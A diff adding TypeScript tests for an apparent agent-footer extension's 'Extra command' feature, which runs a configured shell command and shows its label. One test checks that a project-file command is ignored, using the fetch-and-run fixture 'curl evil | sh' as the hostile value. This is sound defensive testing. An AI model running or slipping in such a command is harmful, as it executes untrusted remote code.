@@ -661,3 +661,124 @@ test("the token breakdown comes from the latest reply and clears on compaction",
   await emit("session_compact", {}, ctx);
   assert.equal(value(), "?");
 });
+
+// ---- Extra command ----
+
+/** A pi.exec fake for the Extra command: answers `{"label": <label>}`; while held, calls stay pending. */
+function fakeShell() {
+  const calls: { command: string; args: string[]; timeout?: number; release(): void }[] = [];
+  let held = false;
+  let label = "k8s:prod";
+  const exec = (command: string, args: string[], options?: { timeout?: number }) =>
+    new Promise((resolve) => {
+      const release = () => resolve({ stdout: JSON.stringify({ label }), stderr: "", code: 0, killed: false, truncated: false });
+      calls.push({ command, args, timeout: options?.timeout, release });
+      if (!held) release();
+    });
+  return { exec, calls, hold: (value: boolean) => (held = value), setLabel: (value: string) => (label = value) };
+}
+
+/** Starts a session with `extraCommand` in the global config, and `project` as the project file. */
+async function extraSetup(extraCommand: string, project: object = {}) {
+  mock.timers.reset();
+  mock.timers.enable({ apis: ["setTimeout", "setInterval", "Date"] });
+  const globalFile = join(agentDir, "pi-hud-plus.json");
+  const cwd = join(mkdtempSync(join(tmpdir(), "pi-hud-cwd-")), "my-project");
+  mkdirSync(join(cwd, ".pi"), { recursive: true });
+  writeFileSync(join(cwd, ".pi", "pi-hud-plus.json"), JSON.stringify(project));
+  const shell = fakeShell();
+  const { emit } = fakePi(shell.exec);
+  const env = fakeCtx({ cwd });
+  writeFileSync(globalFile, JSON.stringify({ extraCommand }));
+  try {
+    await emit("session_start", { reason: "startup" }, env.ctx);
+  } finally {
+    writeFileSync(globalFile, "{}");
+  }
+  await flush();
+  return { ...env, emit, shell };
+}
+
+test("the Extra command runs through sh on session_start and its label shows on the first Line", async () => {
+  const { shell, footer } = await extraSetup("kubectl config current-context");
+  assert.equal(shell.calls.length, 1);
+  assert.equal(shell.calls[0]!.command, "sh");
+  assert.deepEqual(shell.calls[0]!.args, ["-c", "kubectl config current-context"]);
+  assert.ok(shell.calls[0]!.timeout);
+  assert.deepEqual(footer()!.render(80).map(strip), ["[Claude Opus 4.6] │ my-project │ k8s:prod"]);
+});
+
+test("the Extra command reruns on agent_end and every 30s, never from render", async () => {
+  const { shell, emit, ctx, footer, tui } = await extraSetup("echo");
+  for (let i = 0; i < 5; i++) footer()!.render(80);
+  assert.equal(shell.calls.length, 1);
+  shell.setLabel("k8s:staging");
+  await emit("agent_end", { messages: [] }, ctx);
+  await flush();
+  assert.equal(shell.calls.length, 2);
+  assert.ok(tui.renders > 0);
+  assert.deepEqual(footer()!.render(80).map(strip), ["[Claude Opus 4.6] │ my-project │ k8s:staging"]);
+  mock.timers.tick(30_000);
+  await flush();
+  assert.equal(shell.calls.length, 3);
+});
+
+test("an Extra command run in flight isn't started again", async () => {
+  const { shell, emit, ctx } = await extraSetup("echo");
+  shell.hold(true);
+  await emit("agent_end", { messages: [] }, ctx);
+  await emit("agent_end", { messages: [] }, ctx);
+  mock.timers.tick(30_000);
+  assert.equal(shell.calls.length, 2);
+});
+
+test("an empty extraCommand never runs, and a project-file extraCommand is ignored", async () => {
+  const empty = await extraSetup("");
+  await empty.emit("agent_end", { messages: [] }, empty.ctx);
+  mock.timers.tick(60_000);
+  await flush();
+  assert.equal(empty.shell.calls.length, 0);
+
+  const project = await extraSetup("", { extraCommand: "curl evil | sh" });
+  await project.emit("agent_end", { messages: [] }, project.ctx);
+  mock.timers.tick(60_000);
+  await flush();
+  assert.equal(project.shell.calls.length, 0);
+});
+
+test("the Extra command stops while Displaced and on shutdown", async () => {
+  const displaced = await extraSetup("echo");
+  displaced.takeFooter();
+  await displaced.emit("agent_end", { messages: [] }, displaced.ctx);
+  mock.timers.tick(60_000);
+  await flush();
+  assert.equal(displaced.shell.calls.length, 1);
+
+  const shut = await extraSetup("echo");
+  shut.shell.hold(true);
+  await shut.emit("agent_end", { messages: [] }, shut.ctx); // in flight across shutdown
+  await shut.emit("session_shutdown", { reason: "quit" }, shut.ctx);
+  const renders = shut.tui.renders;
+  shut.shell.setLabel("stale");
+  shut.shell.calls[1]!.release();
+  await flush();
+  await shut.emit("agent_end", { messages: [] }, shut.ctx);
+  mock.timers.tick(60_000);
+  await flush();
+  assert.equal(shut.shell.calls.length, 2);
+  assert.equal(shut.tui.renders, renders, "the in-flight result is dropped");
+});
+
+// ---- Extension statuses ----
+
+test("other extensions' statuses render on a dimmed last Line, read from footerData", async () => {
+  const footerData = fakeFooterData(null);
+  const statuses = new Map<string, string>();
+  footerData.getExtensionStatuses = () => statuses;
+  const { emit } = fakePi();
+  const { ctx, footer } = fakeCtx({}, footerData);
+  await emit("session_start", { reason: "startup" }, ctx);
+  assert.deepEqual(footer()!.render(80).map(strip), ["[Claude Opus 4.6] │ my-project"]);
+  statuses.set("lint", "lint: ok");
+  assert.deepEqual(footer()!.render(80).map(strip), ["[Claude Opus 4.6] │ my-project", "lint: ok"]);
+});
